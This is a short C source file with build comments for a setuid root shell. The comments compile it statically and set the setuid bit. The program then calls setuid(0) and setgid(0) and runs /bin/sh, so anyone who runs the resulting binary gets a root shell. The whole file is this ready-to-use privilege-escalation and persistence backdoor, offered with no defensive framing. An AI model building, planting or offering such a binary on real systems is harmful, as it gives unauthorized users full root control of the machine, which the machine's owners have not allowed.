// $ gcc -static -o root-shell root-shell.c
// $ chmod u+s root-shell

#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0);
  setgid(0);
  system("/bin/sh");
  return 0;
}
